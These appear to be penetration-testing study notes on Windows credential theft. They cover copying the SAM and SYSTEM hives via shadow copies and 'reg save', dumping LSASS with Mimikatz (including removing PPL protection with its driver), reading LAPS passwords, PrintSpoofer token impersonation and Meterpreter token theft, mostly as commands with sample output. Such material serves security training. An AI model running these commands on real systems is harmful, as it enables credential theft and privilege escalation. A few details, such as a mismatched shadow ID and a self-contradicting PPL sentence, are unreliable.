## Local Windows Credentials

Local Windows credentials are stored in the Security Account Manager (SAM) database password hashes using the NTLM hashing format, which is based on MD4 algorithm. The windows has a build in
Administrator account. The account is disabled by defult on window workstation since Vista. Howevere, the account is enabled on servers by default. This could be an possible attack factor.
All Windows account has a unique Security Identifier(SID) with the following format. 

```
S-R-X-Y1-Y2-Yn-1-Yn
```

```
|Comment |Description
|S       | Indicates that the string is a SID
|R       | Indicates the revision level
|X       | Indicates the identifier authority value
|Y       | Represents a series of subauthority values, where n is the number of values
```

#### Copy SAM
we’ll attempt to obtain credentials for this user account from the SAM database. The SAM is
located at C:\Windows\System32\config\SAM, but the SYSTEM process has an exclusive lock on
it, preventing us from reading or copying it even from an administrative command prompt:

we’ll launch wmic, specify the shadowcopy class, create a new shadow volume and
specify the source drive with “Volume=‘C:\’”. This will create a snapshot of the C drive. 

```
C:\> wmic shadowcopy call create Volume='C:\'
```

To verify this, we’ll run vssadmin and list the existing shadow volumes with list shadows

```
C:\> vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.
Contents of shadow copy set ID: {8e3a3a18-93a6-4b18-bc54-7639a9baf7b2}
Contained 1 shadow copies at creation time: 11/14/2019 6:53:26 AM
Shadow Copy ID: {13fb63f9-f631-408a-b876-9032a9609c22}
Original Volume: (C:)\\?\Volume{a74776de-f90e-4e66-bbeb-1e507d7fa0d4}\
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

Now that we’ve confirmed the creation of the shadow volume, we can copy the SAM database
from it using the source path.

Now we have the SAM database, it is partially encrypted by either RC4 AES. The encryption keys are stored in 
the SYSTEM file, which is in the same folder as the SAM
database. However, it is also locked by the SYSTEM account.
```
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\huifeng1\Downloads\sam

C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\huifeng1\Downloads\system
```

Don't forget to delete the shadows, {e0331775-2d51-48dc-817e-007a5b97b885} is the shadowID
```
vssadmin delete shadows /shadow={e0331775-2d51-48dc-817e-007a5b97b885} /quiet
```
#### minidump

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

We can also copy sam and system file from reg key

```
C:\> reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
C:\> reg save HKLM\system C:\users\offsec.corp1\Downloads\system
```

Now we can decrypt and dump NTLM hash with [creddump.py](https://github.com/CiscoCXSecurity/creddump7)
```
samdump2 ~/system ~/sam
```

In 2015, Microsoft released Local Administrator Password Solution (LAPS), which offered a
secure and scalable way of remotely managing the local administrator password for domainjoined computers. If LAPS is in use, we should try to gain access to the clear text passwords in Active Directory.

we can use the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) PowerShell script

```
PS C:\Tools> Import-Module .\LAPSToolkit.ps1
PS C:\Tools> Get-LAPSComputers
```
## Access Token and Elevation with Impersonation token

An access token is created by the kernel upon user authentication and contains important values that are linked to a specific user through the SID. Local administrators receive two access tokens when authenticating. The first (which is used by default) is configured to create processes as medium integrity. When a user selects the “Run as administrator” option for an application, the second elevated token is used instead. The User Account Control (UAC) mechanism links these two tokens to a single user and
creates the consent prompt.

Privileges are also included in the access token. if the present privileges are enabled or disabled and may be
dynamically updated through the Win32 AdjustTokenPrivileges API. For example, a user has SeShutdownPrivilege disabled, if the user oose to shut down the computer through the shutdown command the back-end code will enable the privilege with AdjustTokenPrivileges and then perform the required actions to power off the operating system. We can add/update accounts's permission/token though **secpol.msc**.

There are many different token privilege escalation ttp discussed in this [blog](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/). We create a c# code [PrintSpooferNet](/10WindowsCred/PrintSpofferNet.cs) that allow us to escalate permission to system account when the current user has SeImpersonatePrivilege.

Our PrintSpooferNet code use [PrintSpoofer attack](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) that relies on windows pipes. The attack is based on the fact that the print spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes. If we can create a process running with the SeImpersonatePrivilege privilege that simulates a print client,
we will obtain a SYSTEM token that we can impersonate.

A pipe is a section of shared memory inside the kernel that processes can use for communication. One process can create a pipe (the pipe server) while other processes can
connect to the pipe (pipe clients) and read/write information from/to it, depending on the permission.

we can use the [SpoolSample](https://github.com/leechristensen/SpoolSample) C# implementation written by Lee Christensen to call MS-RPRN APIs. And run our PrintSpooferNet.cs 
code to catch the pie connection.

start the connection
```
C:\user> SpoolSample.exe targetserverName targetserver/pipe/test
```
wait for connection and and steal system token to open cmd
```
C:\user> PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
```

#### Meterpreter Incognito
Meterpreter Incognito module to impersonate any logged in users and obtain code execution in their context without access to any passwords or hashes.

Load module
```
meterpreter > load incognito
Loading extension incognito...Success.
```

list all currently used tokens by unique username
```
meterpreter > list_tokens -u
Delegation Tokens Available
========================================
corp1\admin
IIS APPPOOL\DefaultAppPool
NT AUTHORITY\IUSR
```

Impersonate
```
meterpreter > impersonate_token corp1\\admin
[+] Delegation token available
[+] Successfully impersonated user corp1\admin
meterpreter > getuid
Server username: corp1\admin
```

#### Mimikatz

If a user has SeDebugPrivilege, the user can read and modify a process under the ownership of a different user. We can use Mimikatz
privilege::debug command to enable the SeDebugPrivilege by calling AdjustTokenPrivileges.

```
C:\Tools\Mimikatz> mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK
```
After enabled the SeDebugPrivilege privilege, we can dump cached password and hashes from LSASS
```
mimikatz # sekurlsa::logonpasswords
```

Since 2012 Microsoft has developed mitigation techniques: LSA Protection and Windows Defender Credential Guard.This means that a process running at SYSTEM integrity cannot access or modify the memory space of a process executing at SYSTEM integrity with level, Protected Processes Light (PPL) enabled.

```
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```
PPL protection is controlled by a bit residing in the EPROCESS kernel object associated with the
target process. If we could obtain code execution in kernel space, we could disable the LSA
protection and dump the credentials.

this can be achieved with Mimikatz since it comes bundled with the mimidrv.sys driver. If we are running as admin, we have SeLoadDriverPrivilege privilege and the ability to load any signed drivers.
```
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

after loading the driver, we can disable the PPL protection, and dump the hashs
```
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 536 -> 00/00 [0-0-0]

mimikatz # sekurlsa::logonpasswords
```

#### Memory dumping the LSASS

We can create a lsass dump file from task manager. And retrive the hashs from dumped file

![image](https://user-images.githubusercontent.com/24555370/145666196-39a66a44-e96d-4fa3-9ac8-f86ffbac06b3.png)

dump the hash by first loading the dumped file, and run sekurlsa::logonpasswords
```
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'


mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...
Authentication Id : 0 ; 32785103 (00000000:01f442cf)
Session : RemoteInteractive from 1
User Name : admin
```

#### C# code to dump the lsass

We can write our own application [minidump.cs](/10WindowsCred/minidump.cs) in C# to memory dump lsass.
